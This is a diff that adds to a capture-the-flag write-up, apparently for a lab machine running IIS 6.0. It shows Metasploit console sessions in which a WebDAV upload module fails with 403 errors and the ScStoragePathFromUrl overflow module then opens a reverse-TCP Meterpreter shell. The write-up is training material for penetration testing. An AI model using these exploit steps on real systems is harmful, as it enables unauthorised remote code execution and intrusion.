@@ -5,7 +5,9 @@
 # Summary
 ### 1. NMAP
 
-### 2. X
+### 2. Enumeration
+
+### 3. Exploit
 
 # Attack
 ## 1. NMAP
@@ -95,3 +97,79 @@ Shellcodes: No Results
 Ooh, quite a few potential exploits. We also Google "microsoft iis httpd 6.0 exploit" to limit down our search. We see two metasploit modules, [Microsoft IIS WebDAV Write Access Code Execution](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_upload_asp/) & [Microsoft IIS WebDav ScStoragePathFromUrl Overflow](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/).
 
 ## 3. Exploit
+Let's try [Microsoft IIS WebDAV Write Access Code Execution](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_upload_asp/) first.
+```
+msf5 > use exploit/windows/iis/iis_webdav_upload_asp
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf5 exploit(windows/iis/iis_webdav_upload_asp) > show targets
+...
+msf5 exploit(windows/iis/iis_webdav_upload_asp) > show options
+
+Module options (exploit/windows/iis/iis_webdav_upload_asp):
+
+   Name          Current Setting        Required  Description
+   ----          ---------------        --------  -----------
+   HttpPassword                         no        The HTTP password to specify for authentication
+   HttpUsername                         no        The HTTP username to specify for authentication
+   METHOD        move                   yes       Move or copy the file on the remote system from .txt -> .asp (Accepted: move, copy)
+   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload
+   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT         80                     yes       The target port (TCP)
+   SSL           false                  no        Negotiate SSL/TLS for outgoing connections
+   VHOST                                no        HTTP server virtual host
+...
+msf5 exploit(windows/iis/iis_webdav_upload_asp) > exploit
+
+[*] Started reverse TCP handler on 10.10.x.x:4444 
+[*] Checking /metasploit7894726.asp
+[*] Uploading 609576 bytes to /metasploit7894726.txt...
+[-] Upload failed on /metasploit7894726.txt [403 Forbidden]
+[*] Exploit completed, but no session was created.
+```
+Hmm, `403 Forbidden`. Let's change something up and see if it makes any difference.
+```
+msf5 exploit(windows/iis/iis_webdav_upload_asp) > set method copy
+method => copy
+msf5 exploit(windows/iis/iis_webdav_upload_asp) > exploit
+
+[*] Started reverse TCP handler on 10.10.x.x:4444 
+[*] Checking /metasploit264443075.asp
+[*] Uploading 609405 bytes to /metasploit264443075.txt...
+[-] Upload failed on /metasploit264443075.txt [403 Forbidden]
+[*] Exploit completed, but no session was created.
+```
+Still the same `403 Forbidden` message.
+
+Let's try the other exploit, [Microsoft IIS WebDav ScStoragePathFromUrl Overflow](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/).
+```
+msf5 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show targets
+...
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options
+...
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit
+
+[*] Started reverse TCP handler on 10.10.x.x:4444 
+[*] Trying path length 3 to 60 ...
+[*] Sending stage (176195 bytes) to 10.10.10.14
+[*] Meterpreter session 1 opened (10.10.x.x:4444 -> 10.10.10.14:1030) at 2021-01-26 19:22:06 +0800
+
+meterpreter > 
+```
+We got a Meterpreter shell! Time to find flags.
+
+Let's try to navigate around in Users.
+```
+meterpreter > cd Administrator
+[-] stdapi_fs_chdir: Operation failed: Access is denied.
+meterpreter > cd Harry
+[-] stdapi_fs_chdir: Operation failed: Access is denied.
+```
+Hmm, Access is denied. Let's try `getuid`.
+```
+meterpreter > getuid
+[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
+```
+Time for privilege escalation.
